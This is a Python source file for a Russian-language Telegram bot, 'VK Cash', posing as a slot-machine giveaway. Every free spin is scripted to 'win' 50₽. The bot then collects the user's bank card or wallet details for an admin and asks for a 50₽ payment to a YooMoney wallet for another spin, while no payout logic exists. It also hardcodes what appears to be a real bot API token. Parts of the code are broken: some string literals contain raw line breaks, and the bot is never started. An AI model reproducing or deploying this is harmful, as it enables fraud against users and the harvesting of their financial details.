
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import re
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_states = {}
first_spin_done = {}

CODES_FILE = "codes.json"
VKCOIN_FILE = "vkcoins.json"

if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)
if not os.path.exists(VKCOIN_FILE):
    with open(VKCOIN_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

def add_vkcoins(user_id, amount):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    coins[str(user_id)] = coins.get(str(user_id), 0) + amount
    with open(VKCOIN_FILE, "w") as f:
        json.dump(coins, f, indent=4)

def get_leaderboard(top_n=5):
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    stats = {}
    for code, data in codes.items():
        if data["used"]:
            uid = data["user_id"]
            stats[uid] = stats.get(uid, 0) + data["amount"]
    sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
    return sorted_stats[:top_n]

def get_main_markup(user_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"))
    markup.add(InlineKeyboardButton("🛒 Магазин", callback_data="shop"),
               InlineKeyboardButton("🏆 Топ", callback_data="leaderboard"))
    markup.add(InlineKeyboardButton("📜 Правила", callback_data="rules"),
               InlineKeyboardButton("❓ FAQ", callback_data="faq"))
    markup.add(InlineKeyboardButton("📋 Политика", callback_data="policy"))
    markup.add(InlineKeyboardButton("💵 Оплатить повторную прокрутку 50₽", url="https://yoomoney.ru/to/4100119077541618"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("👑 Админ-панель", callback_data="admin"))
    return markup

@bot.message_handler(commands=['start'])
def send_start(message):
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!
Выбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
        return
    first_spin_done[uid] = True
    amount = 50
    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...
[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
    bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    uid = message.from_user.id
    if uid in user_states:
        state = user_states.pop(uid)
        code = state["code"]
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        if code not in codes:
            bot.send_message(uid, "❌ Код не найден. Попробуйте сначала.")
            return
        if codes[code]["used"]:
            bot.send_message(uid, "⚠️ Этот код уже использован.")
            return
        if codes[code]["user_id"] != uid:
            bot.send_message(uid, "⛔ Этот код не принадлежит вам.")
            return
        payout_info = (
            f"💰 Новая заявка от @{message.from_user.username or message.from_user.first_name}:\n"
            f"🆔 ID: {uid}\n"
            f"🔐 Код: {code}\n"
            f"📦 Сумма: {state['amount']}₽\n"
            f"💳 Реквизиты: {message.text}"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💸 Выплатить вручную", url="https://yoomoney.ru/main"))
        bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
        bot.send_message(uid, "✅ Заявка принята!\n⏳ Ожидайте выплату в течение 1 часа.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
